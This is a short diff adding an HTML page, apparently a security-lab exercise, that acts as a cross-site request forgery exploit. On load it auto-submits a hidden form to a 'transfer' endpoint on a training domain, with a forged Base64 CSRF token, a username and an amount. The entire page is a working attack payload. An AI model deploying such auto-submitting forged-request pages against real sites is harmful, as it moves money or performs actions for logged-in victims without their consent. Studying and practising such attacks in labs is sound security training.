@@ -1,0 +1,18 @@
+<html>
+<head>
+    <title>Trans</title>
+</head>
+<body>
+    <h1>transs...</h1>
+    <form id="trans" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+        <input type="hidden" name="csrf_token" value="MjAwNQ=="> <!-- Base64 -->
+        <input type="hidden" name="username" value="z5564895">
+        <input type="hidden" name="amount" value="5">
+    </form>
+    <script>
+        window.onload = function() {
+            document.getElementById("trans").submit();
+        };
+    </script>
+</body>
+</html>
